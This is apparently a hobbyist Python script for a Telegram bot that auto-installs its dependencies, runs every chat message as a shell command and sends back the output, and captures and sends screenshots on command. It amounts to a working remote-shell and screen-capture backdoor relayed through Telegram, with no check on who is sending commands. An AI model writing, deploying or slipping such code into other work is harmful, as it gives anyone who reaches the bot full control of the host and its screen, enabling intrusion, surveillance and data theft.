# Importing the basic modules
import logging
import subprocess
import time
import os

# List of modules required for this to work
modules_to_install = ['python-telegram-bot', 'pyautogui']
# Putting it in a try, except block
try:
    # Iterate over the modules to install them using pip
    for module in modules_to_install:
        subprocess.check_call(['pip', 'install', module])
except:
    print('Try again? Maybe with internet?')

#Importing Modules
try:
    import pyautogui
    from telegram import Update
    from telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes
except:
    print('Issues with module import')

#logging all the data for now, will remove it in future additions
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

#TODO - To add a webhook that can notify the user when it triggers

#Defining a function that will take care of the first /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Connection Established")

#Defining a function that will take screenshot and send it to the bot
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #TODO - The functionality to have different types of screenshots

    #capture the screenshot
    screenshot = pyautogui.screenshot()

    #save the screenshot
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)

    #send the screenshot
    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'))

    #delte the screenshot
    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)

#Defining our echo function that takes care of all the messages
async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #This is to run the command in the shell
    output = subprocess.check_output(update.message.text, shell=True).decode('utf-8')

    #Printing out the output for debug purposes
    print(output)
    #TODO - The functionality to send long text
    #If the output is empty send the response as "no output"
    if(output):
        await context.bot.send_message(chat_id=update.effective_chat.id, text=output)
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="no output")

if __name__ == '__main__':
    #Api_Key goes here
    with open('token.txt', 'r') as fh:
        api_token = fh.read().strip()
        print(api_token)
    application = ApplicationBuilder().token(api_token).build()

    #starting the function
    echo_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), echo)
    start_handler = CommandHandler('start', start)
    screenshot_handler = CommandHandler('screenshot', screenshot)

    application.add_handler(start_handler)
    application.add_handler(echo_handler)
    application.add_handler(screenshot_handler)
    
    application.run_polling()
